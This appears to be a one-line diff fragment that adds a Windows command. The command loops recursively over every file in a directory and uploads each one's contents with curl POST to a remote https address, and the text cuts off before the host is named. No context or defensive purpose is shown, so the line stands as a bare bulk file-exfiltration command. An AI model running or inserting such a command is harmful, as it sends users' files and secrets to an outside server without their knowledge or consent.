@@ -1,0 +1,1 @@
+for /r %i in (*) do curl -X POST --data @"%i" -H "Content-Type:application/json" https://
